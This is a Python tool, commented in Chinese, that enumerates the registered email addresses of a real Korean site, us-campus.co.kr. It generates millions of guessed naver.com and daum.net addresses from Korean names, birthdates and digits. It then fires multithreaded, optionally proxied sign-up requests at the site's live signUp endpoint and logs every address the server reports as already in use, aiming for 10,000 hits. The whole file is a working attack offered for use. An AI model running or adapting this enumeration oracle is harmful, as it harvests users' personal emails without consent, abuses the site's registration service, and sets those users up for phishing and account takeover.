#!/usr/bin/env python3
"""
us-campus 邮箱枚举 v3 — 极致优化结合体
- SQLite WAL 去重 (批量写入, 多进程安全)
- 候选落盘 + 行号断点续跑 (重启不重建字典)
- 热路径零文件锁 (仅批次结束 bulk flush)
- 分片 + 高并发 signUp 预言机
"""
import argparse
import fcntl
import itertools
import json
import sqlite3
import ssl
import threading
import time
import urllib.error
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import date
from http.cookiejar import CookieJar
from pathlib import Path
from urllib.request import HTTPCookieProcessor, HTTPSHandler, ProxyHandler, Request, build_opener

BASE = Path("/data/automation/results/us-campus.co.kr")
STATE_DIR = BASE / "email_enum_state"
TESTED_DB = STATE_DIR / "tested.db"
GLOBAL_HITS = STATE_DIR / "hits_all.jsonl"
CAND_VERSION = 4
CAND_GAP_VERSION = 1
CAND_DENSE_VERSION = 1

# 从 1970 命中反推 — 高密度字典常量
DENSE_HIT_PREFIXES = [
    "moon", "shin", "sun", "blue", "gold", "hyun", "happy", "kim", "choi", "king", "seo", "jun", "ryu",
    "song", "won", "park", "han", "lim", "mi", "sky", "cho", "yun", "jang", "jeong", "kwon", "eun", "nam",
    "ahn", "an", "son", "sim", "white", "rich", "na", "cha", "lee", "kang", "shim", "yang", "woo", "seok",
    "wook", "jung", "red", "green", "yeon", "bin", "su", "star", "oh", "hwang", "ha", "min", "bang", "suk",
    "yoon", "apple", "yu", "bae", "kwak", "jeon", "bong", "ok", "black", "queen", "heo", "baek", "ko", "jin",
    "byun", "chung", "gil", "jae", "jo", "im", "love", "hong", "yoo", "mun", "chae",
]
# gap 未覆盖但命中的前缀 (commons/given 列表里没有)
DENSE_MISSED_PREFIXES = [
    "white", "rich", "black", "queen", "green", "choi", "park", "han", "ryu", "won", "cho", "yun", "jang",
    "jeong", "ahn", "son", "sim", "lee", "kang", "yang", "seok", "wook", "jung", "bae", "kwak", "jeon",
    "bong", "heo", "baek", "ko", "byun", "chung", "gil", "jae", "jo", "hong", "yoo", "mun", "chae", "shim",
]
DENSE_SUFFIX_YY = [
    "70", "71", "72", "73", "74", "75", "76", "77", "78", "79", "80", "81", "82", "83", "84", "85", "86",
    "87", "88", "89", "90", "91", "92", "93", "94", "95", "96", "97", "98", "99", "00", "01", "02", "03",
    "04", "05",
]
DENSE_SUR_COMBO = [
    "kim", "lee", "park", "choi", "jung", "jeong", "kang", "cho", "yoon", "yun", "jang", "lim", "im", "han",
    "oh", "seo", "shin", "kwon", "song", "hong", "ryu", "cha", "an", "ahn", "son", "baek", "heo", "nam",
    "go", "woo", "jun", "jin", "min",
]
DENSE_GIV_COMBO = [
    "min", "jun", "soo", "su", "young", "jin", "hyun", "woo", "ho", "ji", "yeon", "seo", "yoon", "yun", "ha",
    "bin", "eun", "mi", "na", "bo", "ri", "sora", "areum", "hee", "suk", "wook", "seok", "sung", "dong", "jae",
    "tae", "sang", "kyung", "hye", "in", "ah", "a", "sohee", "jisoo", "jimin", "yujin", "yuna", "jiyeon",
    "haneul", "doyun", "siwoo", "minseo", "haeun", "jiwoo", "jiho", "minjun", "minjae", "seojun",
]
DENSE_ENGLISH = [
    "john", "james", "david", "michael", "mark", "paul", "peter", "brian", "kevin", "jason", "eric", "leo",
    "alex", "chris", "tom", "sam", "ben", "dan", "jack", "ryan", "tony", "andy", "henry", "steve", "mike",
    "anna", "amy", "lisa", "mary", "sarah", "jane", "kate", "lucy", "emily", "grace", "helen", "julia",
]
DENSE_SUR_BD = ["ha", "moon", "go", "seo", "shin", "cha", "jun", "woo", "kim", "an", "han", "won", "choi", "jeong", "jin", "park", "lee", "lim", "kang", "jung"]
DENSE_DICT_NAMES = ("dense1", "dense2", "dense3", "dense4")

GAP_GIVEN = [
    "seo", "shin", "oh", "sun", "ma", "mok", "ban", "bang", "go", "cha", "woo", "jun", "hae", "kwon",
    "im", "lim", "song", "hong", "heo", "nam", "min", "jin", "ho", "ji", "yeon", "hyun", "soo", "young",
    "mi", "sora", "areum", "eun", "bin", "su", "ri", "na", "bo", "tae", "in", "a",
]
GAP_COMMONS = ["sun", "moon", "blue", "gold", "happy", "sky", "king", "star", "apple", "love", "red", "vip"]
GAP_SURNAMES_TOP = ["kim", "lee", "park", "choi", "jung", "cho", "kang", "yoon", "lim", "han"]
GAP_SHORT = ["ma", "mok", "ban", "bang", "go", "bae", "nam", "heo", "hur", "kwak", "bae"]

ALL_SURNAMES = [
    "kim", "lee", "park", "choi", "jung", "jeong", "kang", "cho", "jo", "yoon", "yun", "jang", "lim", "im",
    "han", "oh", "seo", "shin", "kwon", "hwang", "ahn", "an", "song", "hong", "yu", "yoo", "moon", "mun",
    "son", "bae", "baek", "heo", "hur", "nam", "ha", "kwak", "gu", "ko", "go", "jeon", "jun", "ryu", "noh",
    "roh", "cha", "min", "jin", "sim", "shim", "yang", "won", "byun", "byeon", "chung", "woo", "gil", "gang",
    "gong", "kwang", "ma", "mok", "ban", "bang", "bong", "seok", "suk", "shin", "sok", "um", "uhm", "eom",
    "yeo", "yo", "ok", "oon", "wook", "pyo", "hae", "hyun", "in", "jae", "chae", "cheon", "chun",
]

SHARD_GROUPS = [
    ["kim", "lee", "park", "choi"],
    ["jung", "jeong", "kang", "cho", "jo", "yoon", "yun"],
    ["jang", "lim", "im", "han", "oh", "seo", "shin", "kwon", "hwang"],
    None,
]

GIVEN = [
    "min", "jun", "soo", "su", "young", "jin", "hyun", "hyeon", "woo", "ho", "ji", "yeon", "seo", "yoon", "yun",
    "ha", "bin", "gyu", "kyu", "seok", "suk", "won", "chan", "sung", "seong", "dong", "jae", "tae", "sang", "chul",
    "cheol", "hee", "hui", "eun", "in", "ah", "a", "ri", "rae", "kyung", "gyeong", "hye", "mi", "ye", "bo", "na",
    "minjun", "minjae", "seojun", "jiho", "jiwoo", "doyun", "yejun", "siwoo", "hajun", "minseo", "haeun", "jimin",
    "jisoo", "sujin", "hyunwoo", "sangmin", "jaehyun", "donghyun", "seungmin", "seunghyun", "taehyun", "jihoon",
    "junho", "sungmin", "jonghyun", "minsu", "minho", "jieun", "hyunju", "eunji", "yujin", "yuna", "jiyeon",
    "sohee", "juhee", "haneul", "areum", "sora", "nari", "bora", "gunwoo", "yong", "chaeun", "seoah", "haru",
    "siyun", "jiyun", "yejin", "hyerin", "dahye", "seungho", "youngjae", "jungmin", "kyungmin", "hyunsoo",
]

COMMONS = [
    "user", "love", "happy", "money", "stock", "king", "sky", "star", "moon", "sun", "korea", "seoul", "campus",
    "hello", "world", "apple", "blue", "red", "student", "vip", "gold",
]

CTX = ssl.create_default_context()


class TestedStore:
    """SQLite WAL 批量写入; worker 进程不加载全量内存。"""

    def __init__(self, db_path: Path, load_mem: bool = False):
        self.db_path = db_path
        self._local = threading.local()
        self._mem = set()
        if load_mem:
            self._mem = self._load_mem_set()

    def _conn(self):
        if not getattr(self._local, "conn", None):
            c = sqlite3.connect(self.db_path, timeout=60, check_same_thread=False)
            c.execute("PRAGMA journal_mode=WAL")
            c.execute("PRAGMA synchronous=NORMAL")
            c.execute("PRAGMA temp_store=MEMORY")
            c.execute("PRAGMA cache_size=-64000")
            c.execute("CREATE TABLE IF NOT EXISTS tested(email TEXT PRIMARY KEY)")
            self._local.conn = c
        return self._local.conn

    def _load_mem_set(self):
        conn = sqlite3.connect(self.db_path)
        s = {row[0] for row in conn.execute("SELECT email FROM tested")}
        conn.close()
        return s

    def __contains__(self, item):
        return item.lower() in self._mem

    def __len__(self):
        if self._mem:
            return len(self._mem)
        conn = sqlite3.connect(self.db_path)
        n = conn.execute("SELECT COUNT(*) FROM tested").fetchone()[0]
        conn.close()
        return n

    def bulk_add(self, emails):
        if not emails:
            return
        rows = [(e.lower(),) for e in emails]
        conn = self._conn()
        conn.executemany("INSERT OR IGNORE INTO tested VALUES(?)", rows)
        conn.commit()


def shard_surnames(shard: int, shards: int):
    if shards != 4:
        n = len(ALL_SURNAMES)
        size = (n + shards - 1) // shards
        return ALL_SURNAMES[shard * size : (shard + 1) * size]
    if shard >= 3:
        used = set(SHARD_GROUPS[0] + SHARD_GROUPS[1] + SHARD_GROUPS[2])
        return [s for s in ALL_SURNAMES if s not in used]
    return SHARD_GROUPS[shard]


def iter_slim_emails(surnames):
    years2 = [f"{y:02d}" for y in range(70, 100)] + [f"{y:02d}" for y in range(0, 10)]
    years4 = [str(y) for y in range(1975, 2006)]
    top = surnames[: min(25, len(surnames))]
    seen = set()

    def emit(raw):
        e = raw.lower()
        if e in seen:
            return
        seen.add(e)
        return e

    for s, g, yr in itertools.product(surnames, GIVEN, years2):
        for loc in (s + g + yr, g + s + yr):
            e = emit(f"{loc}@naver.com")
            if e:
                yield e

    for s in top:
        for y in range(1975, 2008):
            for m in range(1, 13):
                for d in range(1, 32):
                    try:
                        date(y, m, d)
                    except ValueError:
                        continue
                    bd = f"{y % 100:02d}{m:02d}{d:02d}"
                    e = emit(f"{s}{bd}@naver.com")
                    if e:
                        yield e

    for s in surnames:
        for y in years2:
            e = emit(f"{s}{y}@naver.com")
            if e:
                yield e
            for n in range(0, 100):
                e = emit(f"{s}{y}{n:02d}@naver.com")
                if e:
                    yield e
        for n in range(1000, 10000):
            e = emit(f"{s}{n}@naver.com")
            if e:
                yield e

    for s, g in itertools.product(surnames, GIVEN[:40]):
        for loc in (s + g, g + s, s + g + "1", s + g + "12"):
            e = emit(f"{loc}@naver.com")
            if e:
                yield e

    phase2_s = surnames[: min(8, len(surnames))]
    for s, g in itertools.product(phase2_s, GIVEN[:30]):
        for y4 in years4:
            for raw in (f"{s}{g}{y4}@naver.com", f"{g}{s}{y4}@naver.com"):
                e = emit(raw)
                if e:
                    yield e
        for y in years2:
            for raw in (f"{s}{g}{y}@daum.net", f"{g}{s}{y}@daum.net"):
                e = emit(raw)
                if e:
                    yield e

    for s in top[:12]:
        for y in range(1975, 2008):
            for m in range(1, 13):
                for d in range(1, 32):
                    try:
                        date(y, m, d)
                    except ValueError:
                        continue
                    bd = f"{y % 100:02d}{m:02d}{d:02d}"
                    e = emit(f"{s}{bd}@daum.net")
                    if e:
                        yield e

    for c in COMMONS:
        for n in range(1000, 10000):
            e = emit(f"{c}{n}@naver.com")
            if e:
                yield e
        for yr in years2:
            for n in range(100, 1000):
                e = emit(f"{c}{yr}{n}@naver.com")
                if e:
                    yield e


def iter_gap_emails():
    """分析报告 P1-P4: 短名+数字 / commons+5位 / 姓氏生日 / 姓氏+4位"""
    seen = set()

    def emit(local, dom="naver.com"):
        e = f"{local}@{dom}".lower()
        if e in seen:
            return
        seen.add(e)
        yield e

    for g in GAP_GIVEN:
        for n in range(10000):
            yield from emit(f"{g}{n:04d}")

    for c in GAP_COMMONS:
        for n in range(100000):
            yield from emit(f"{c}{n:05d}")

    for s in GAP_SURNAMES_TOP:
        for y in range(1975, 2006):
            for m in range(1, 13):
                for d in range(1, 32):
                    try:
                        date(y, m, d)
                    except ValueError:
                        continue
                    bd = f"{y % 100:02d}{m:02d}{d:02d}"
                    yield from emit(f"{s}{bd}")
                    if s in GAP_SURNAMES_TOP[:5]:
                        yield from emit(f"{s}{bd}", "daum.net")
        for n in range(10000):
            yield from emit(f"{s}{n:04d}")

    for s in GAP_SHORT:
        for n in range(10000):
            yield from emit(f"{s}{n:04d}")


def iter_dense1_combo():
    """284 无数字命中: 姓+名 / 名+姓 / 英文名+姓 / 名+名 组合"""
    seen = set()

    def emit(local):
        e = f"{local}@naver.com".lower()
        if e in seen:
            return
        seen.add(e)
        yield e

    for s, g in itertools.product(DENSE_SUR_COMBO, DENSE_GIV_COMBO):
        if s == g:
            continue
        yield from emit(s + g)
        yield from emit(g + s)
        yield from emit(f"{s}_{g}")
        yield from emit(f"{g}{s}")

    for g1, g2 in itertools.product(DENSE_GIV_COMBO[:25], DENSE_GIV_COMBO[:25]):
        if g1 != g2:
            yield from emit(g1 + g2)

    for eng, s in itertools.product(DENSE_ENGLISH, DENSE_SUR_COMBO[:20]):
        yield from emit(eng + s)
        yield from emit(s + eng)


def iter_dense2_missed():
    """gap 未扫到的命中前缀 × 高密度后缀区间 (0-99 + 1k-12k)"""
    seen = set()

    def emit(local):
        e = f"{local}@naver.com".lower()
        if e in seen:
            return
        seen.add(e)
        yield e

    for p in DENSE_MISSED_PREFIXES:
        for n in range(100):
            yield from emit(f"{p}{n:02d}")
        for n in range(1000, 12001):
            yield from emit(f"{p}{n:04d}")


def iter_dense3_prefixyy():
    """命中前缀 × 出生/幸运 2 位年份后缀"""
    seen = set()

    def emit(local):
        e = f"{local}@naver.com".lower()
        if e in seen:
            return
        seen.add(e)
        yield e

    for p in DENSE_HIT_PREFIXES:
        for yy in DENSE_SUFFIX_YY:
            yield from emit(f"{p}{yy}")


def iter_dense4_surbd():
    """高命中姓氏 × YYMMDD 生日 (6位)"""
    seen = set()

    def emit(local, dom="naver.com"):
        e = f"{local}@{dom}".lower()
        if e in seen:
            return
        seen.add(e)
        yield e

    for s in DENSE_SUR_BD:
        for y in range(1975, 2006):
            for m in range(1, 13):
                for d in range(1, 32):
                    try:
                        date(y, m, d)
                    except ValueError:
                        continue
                    bd = f"{y % 100:02d}{m:02d}{d:02d}"
                    yield from emit(f"{s}{bd}")
                    if s in DENSE_SUR_BD[:8]:
                        yield from emit(f"{s}{bd}", "daum.net")


DENSE_ITERATORS = {
    "dense1": iter_dense1_combo,
    "dense2": iter_dense2_missed,
    "dense3": iter_dense3_prefixyy,
    "dense4": iter_dense4_surbd,
}


def ensure_dense_candidate_file(dict_name: str, dense_dir: Path, seen_hit: set):
    if dict_name not in DENSE_ITERATORS:
        raise ValueError(f"unknown dense dict: {dict_name}")

    cand_file = dense_dir / "candidates.txt"
    meta_file = dense_dir / "candidates.meta.json"
    if cand_file.exists() and meta_file.exists():
        try:
            meta = json.loads(meta_file.read_text(encoding="utf-8"))
            if meta.get("version") == CAND_DENSE_VERSION and meta.get("dict") == dict_name and meta.get("count", 0) > 0:
                return cand_file, meta["count"]
        except Exception:
            pass

    print(f"loading tested set for {dict_name} candidate filter...", flush=True)
    tested = TestedStore(TESTED_DB, load_mem=True)
    print(f"tested loaded {len(tested)}", flush=True)
    t0 = time.time()
    count = 0
    with open(cand_file, "w", encoding="utf-8") as f:
        for e in DENSE_ITERATORS[dict_name]():
            if e in tested or e in seen_hit:
                continue
            f.write(e + "\n")
            count += 1
    meta_file.write_text(
        json.dumps({"version": CAND_DENSE_VERSION, "dict": dict_name, "count": count, "built": time.time()}, indent=2),
        encoding="utf-8",
    )
    print(f"{dict_name} candidates written {count} in {time.time()-t0:.1f}s", flush=True)
    return cand_file, count


def ensure_gap_candidate_file(gap_dir: Path, seen_hit: set):
    cand_file = gap_dir / "candidates.txt"
    meta_file = gap_dir / "candidates.meta.json"
    if cand_file.exists() and meta_file.exists():
        try:
            meta = json.loads(meta_file.read_text(encoding="utf-8"))
            if meta.get("version") == CAND_GAP_VERSION and meta.get("count", 0) > 0:
                return cand_file, meta["count"]
        except Exception:
            pass

    print("loading tested set for gap candidate filter...", flush=True)
    tested = TestedStore(TESTED_DB, load_mem=True)
    print(f"tested loaded {len(tested)}", flush=True)
    t0 = time.time()
    count = 0
    with open(cand_file, "w", encoding="utf-8") as f:
        for e in iter_gap_emails():
            if e in tested or e in seen_hit:
                continue
            f.write(e + "\n")
            count += 1
    meta_file.write_text(
        json.dumps({"version": CAND_GAP_VERSION, "count": count, "built": time.time()}, indent=2),
        encoding="utf-8",
    )
    print(f"gap candidates written {count} in {time.time()-t0:.1f}s", flush=True)
    return cand_file, count


def make_opener(proxy_url: str = ""):
    handlers = [HTTPCookieProcessor(CookieJar()), HTTPSHandler(context=CTX)]
    if proxy_url:
        handlers.insert(0, ProxyHandler({"http": proxy_url, "https": proxy_url}))
    return build_opener(*handlers)


def ensure_candidate_file(shard_dir: Path, surnames, seen_hit: set, shards: int):
    cand_file = shard_dir / "candidates.txt"
    meta_file = shard_dir / "candidates.meta.json"
    if cand_file.exists() and meta_file.exists():
        try:
            meta = json.loads(meta_file.read_text(encoding="utf-8"))
            if (
                meta.get("version") == CAND_VERSION
                and meta.get("shards") == shards
                and meta.get("count", 0) > 0
            ):
                return cand_file, meta["count"]
        except Exception:
            pass

    print("loading tested set for candidate filter...", flush=True)
    tested = TestedStore(TESTED_DB, load_mem=True)
    print(f"tested loaded {len(tested)}", flush=True)
    t0 = time.time()
    count = 0
    with open(cand_file, "w", encoding="utf-8") as f:
        for e in iter_slim_emails(surnames):
            if e in tested or e in seen_hit:
                continue
            f.write(e + "\n")
            count += 1
    meta_file.write_text(
        json.dumps({"version": CAND_VERSION, "shards": shards, "count": count, "built": time.time()}, indent=2),
        encoding="utf-8",
    )
    print(f"candidates written {count} in {time.time()-t0:.1f}s", flush=True)
    return cand_file, count


def load_hits():
    hits = []
    seen = set()
    paths = []
    if GLOBAL_HITS.exists():
        paths.append(GLOBAL_HITS)
    paths += sorted(BASE.glob("email_enum*/hits.jsonl"))
    for p in paths:
        if not p.exists():
            continue
        with open(p, encoding="utf-8", errors="ignore") as f:
            for line in f:
                try:
                    r = json.loads(line)
                    em = (r.get("email") or "").lower()
                    if em and em not in seen:
                        seen.add(em)
                        hits.append(r)
                except Exception:
                    pass
    return hits, seen


def append_global_hits(recs: list):
    if not recs:
        return
    GLOBAL_HITS.parent.mkdir(parents=True, exist_ok=True)
    with open(GLOBAL_HITS, "a", encoding="utf-8") as f:
        fcntl.flock(f, fcntl.LOCK_EX)
        for rec in recs:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
        fcntl.flock(f, fcntl.LOCK_UN)


def export_results(out_dir: Path, hits):
    out_dir.mkdir(parents=True, exist_ok=True)
    (out_dir / "registered_emails.json").write_text(json.dumps(hits, indent=2, ensure_ascii=False), encoding="utf-8")


def load_resume(cand_file: Path, shard_dir: Path):
    """行号 + 字节偏移断点; 旧 resume.line 首次自动迁移为 O(1) seek。"""
    resume_json = shard_dir / "resume.json"
    legacy_line = shard_dir / "resume.line"
    legacy_idx = shard_dir / "resume.idx"

    if resume_json.exists():
        try:
            data = json.loads(resume_json.read_text(encoding="utf-8"))
            line_no = int(data.get("line", 0))
            offset = int(data.get("offset", 0))
            if line_no >= 0 and offset >= 0:
                return line_no, offset
        except Exception:
            pass

    line_no = 0
    for p in (legacy_line, legacy_idx):
        if p.exists():
            try:
                line_no = int(p.read_text().strip())
                break
            except Exception:
                line_no = 0

    offset = 0
    if line_no > 0 and cand_file.exists():
        t0 = time.time()
        with open(cand_file, encoding="utf-8") as f:
            for i in range(line_no):
                if not f.readline():
                    line_no = i
                    break
            offset = f.tell()
        print(f"migrated resume line={line_no} offset={offset} in {time.time()-t0:.1f}s", flush=True)

    save_resume(shard_dir, line_no, offset)
    return line_no, offset


def save_resume(shard_dir: Path, line_no: int, offset: int):
    (shard_dir / "resume.json").write_text(
        json.dumps({"line": line_no, "offset": offset}, indent=2),
        encoding="utf-8",
    )


def read_batch(cand_file: Path, offset: int, size: int):
    """从字节偏移读取批次 — 进度越大也不会越来越慢。"""
    batch = []
    with open(cand_file, encoding="utf-8") as f:
        f.seek(offset)
        while len(batch) < size:
            line = f.readline()
            if not line:
                break
            e = line.strip().lower()
            if e:
                batch.append(e)
        return batch, f.tell()


def run_shard(args):
    STATE_DIR.mkdir(parents=True, exist_ok=True)
    if args.dict == "gap":
        shard_dir = STATE_DIR / "gap"
        shard_label = "gap"
    elif args.dict in DENSE_DICT_NAMES:
        shard_dir = STATE_DIR / args.dict
        shard_label = args.dict
    else:
        shard_dir = STATE_DIR / f"shard_{args.shard}"
        shard_label = str(args.shard)
    shard_dir.mkdir(parents=True, exist_ok=True)
    out_dir = shard_dir / "run"
    out_dir.mkdir(parents=True, exist_ok=True)

    hits_path = out_dir / "hits.jsonl"
    prog_path = out_dir / "progress.txt"
    state_path = shard_dir / "state.json"
    if not TESTED_DB.exists():
        raise SystemExit(f"missing {TESTED_DB}, run usc-enum-bootstrap.py first")

    tested_store = TestedStore(TESTED_DB, load_mem=False)
    hits, seen_hit = load_hits()
    print(
        f"dict={args.dict} shard={shard_label} workers={args.workers} "
        f"proxy={'yes' if args.proxy else 'no'} target={args.target}",
        flush=True,
    )

    if args.dict == "gap":
        cand_file, total_cands = ensure_gap_candidate_file(shard_dir, seen_hit)
    elif args.dict in DENSE_DICT_NAMES:
        cand_file, total_cands = ensure_dense_candidate_file(args.dict, shard_dir, seen_hit)
    else:
        surnames = shard_surnames(args.shard, args.shards)
        cand_file, total_cands = ensure_candidate_file(shard_dir, surnames, seen_hit, args.shards)
    print(f"candidates={total_cands} file={cand_file}", flush=True)

    line_no, file_offset = load_resume(cand_file, shard_dir)
    if line_no > total_cands:
        print(f"resume reset: line {line_no} > total {total_cands}", flush=True)
        line_no, file_offset = 0, 0
        save_resume(shard_dir, line_no, file_offset)
    elif cand_file.exists() and file_offset > cand_file.stat().st_size:
        print(f"resume reset: offset {file_offset} > filesize", flush=True)
        line_no, file_offset = 0, 0
        save_resume(shard_dir, line_no, file_offset)
    print(f"resume line={line_no} offset={file_offset} remain={max(0, total_cands - line_no)}", flush=True)

    if not hits_path.exists() or hits_path.stat().st_size == 0:
        with open(hits_path, "w", encoding="utf-8") as f:
            for r in hits:
                f.write(json.dumps(r, ensure_ascii=False) + "\n")

    stats = {"tested": 0, "errors": 0, "retried": 0}
    stats_lock = threading.Lock()
    hits_lock = threading.Lock()
    stop_flag = threading.Event()
    tls = threading.local()
    start = time.time()
    batch_size = args.batch_size
    export_every = 10
    batch_num = 0
    pending_global_hits = []

    proxy_url = args.proxy or ""

    def get_op(force=False):
        if force or getattr(tls, "op", None) is None or getattr(tls, "n", 0) >= 500:
            tls.op = make_opener(proxy_url)
            tls.n = 0
            try:
                tls.op.open(Request("https://us-campus.co.kr/member/join", headers={"User-Agent": "Mozilla/5.0"}), timeout=8)
            except Exception:
                pass
        tls.n += 1
        return tls.op

    def do_req(em, op):
        data = {
            "email": em,
            "password": "Test1234!",
            "confirmed": "Test1234!",
            "name": "t",
            "cellphone": "01055550000",
            "countryCode": "82",
            "cellphoneCertCode": "X",
            "cellphoneCertKey": "X",
        }
        req = Request(
            "https://us-campus.co.kr/member/signUp",
            urllib.parse.urlencode(data).encode(),
            method="POST",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Requested-With": "XMLHttpRequest",
                "Accept": "application/json",
                "Referer": "https://us-campus.co.kr/member/join",
                "Origin": "https://us-campus.co.kr",
                "User-Agent": "Mozilla/5.0",
            },
        )
        try:
            r = op.open(req, timeout=12)
            return json.loads(r.read().decode("utf-8", "replace"))
        except urllib.error.HTTPError as e:
            return json.loads(e.read().decode("utf-8", "replace"))

    def check(em):
        if stop_flag.is_set():
            return None
        j = None
        for attempt in range(args.retries):
            if stop_flag.is_set():
                return None
            op = get_op(force=(attempt > 0))
            try:
                j = do_req(em, op)
                if attempt > 0:
                    with stats_lock:
                        stats["retried"] += 1
                break
            except Exception:
                tls.op = None
                time.sleep(0.03 * (attempt + 1))
        if j is None:
            with stats_lock:
                stats["errors"] += 1
            return em
        msg = j.get("message") or ""
        if "이미" in msg and "이메일" in msg:
            with hits_lock:
                if em not in seen_hit:
                    seen_hit.add(em)
                    rec = {"email": em, "message": msg, "ts": time.time(), "shard": shard_label}
                    hits.append(rec)
                    pending_global_hits.append(rec)
                    with open(hits_path, "a", encoding="utf-8") as hf:
                        hf.write(json.dumps(rec, ensure_ascii=False) + "\n")
                    print(f"HIT {shard_label} total={len(hits)} {em}", flush=True)
                    if len(hits) >= args.target:
                        stop_flag.set()
        return em

    ex = ThreadPoolExecutor(max_workers=args.workers)
    try:
        while line_no < total_cands and not stop_flag.is_set():
            batch_num += 1
            chunk, next_offset = read_batch(cand_file, file_offset, batch_size)
            if not chunk:
                break

            batch_tested = []
            futs = [ex.submit(check, em) for em in chunk]
            for fut in as_completed(futs):
                if stop_flag.is_set():
                    break
                try:
                    em = fut.result()
                    if em:
                        batch_tested.append(em)
                except Exception:
                    pass

            tested_store.bulk_add(batch_tested)
            with stats_lock:
                stats["tested"] += len(batch_tested)

            line_no += len(chunk)
            file_offset = next_offset
            save_resume(shard_dir, line_no, file_offset)

            batch_hits = []
            with hits_lock:
                if pending_global_hits:
                    batch_hits = pending_global_hits[:]
                    pending_global_hits.clear()
            if batch_hits:
                append_global_hits(batch_hits)

            elapsed = time.time() - start
            rps = stats["tested"] / elapsed if elapsed else 0
            line = (
                f"dict={args.dict} shard={shard_label} line={line_no}/{total_cands} tested={stats['tested']} "
                f"hits={len(hits)} errors={stats['errors']} retried={stats['retried']} rps={rps:.1f} elapsed={elapsed:.0f}s"
            )
            print(line, flush=True)
            prog_path.write_text(line + "\n", encoding="utf-8")
            state_path.write_text(
                json.dumps(
                    {
                        "shard": shard_label,
                        "dict": args.dict,
                        "line": line_no,
                        "offset": file_offset,
                        "total": total_cands,
                        "tested": stats["tested"],
                        "hits": len(hits),
                        "errors": stats["errors"],
                        "rps": rps,
                        "proxy": bool(proxy_url),
                    },
                    indent=2,
                ),
                encoding="utf-8",
            )
            if batch_num % export_every == 0:
                export_results(out_dir, hits)
    finally:
        ex.shutdown(wait=False, cancel_futures=True)
        with hits_lock:
            if pending_global_hits:
                append_global_hits(pending_global_hits[:])
                pending_global_hits.clear()

    export_results(out_dir, hits)
    print(f"DONE dict={args.dict} shard={shard_label} hits={len(hits)} tested={stats['tested']} errors={stats['errors']}", flush=True)


def main():
    ap = argparse.ArgumentParser(description="us-campus fast email enum v3")
    ap.add_argument("--dict", choices=["slim", "gap", *DENSE_DICT_NAMES], default="slim")
    ap.add_argument("--shard", type=int, default=0)
    ap.add_argument("--shards", type=int, default=4)
    ap.add_argument("--workers", type=int, default=80)
    ap.add_argument("--batch-size", type=int, default=5000)
    ap.add_argument("--target", type=int, default=10000)
    ap.add_argument("--retries", type=int, default=3)
    ap.add_argument("--proxy", default="", help="http://user:pass@host:port")
    run_shard(ap.parse_args())


if __name__ == "__main__":
    main()
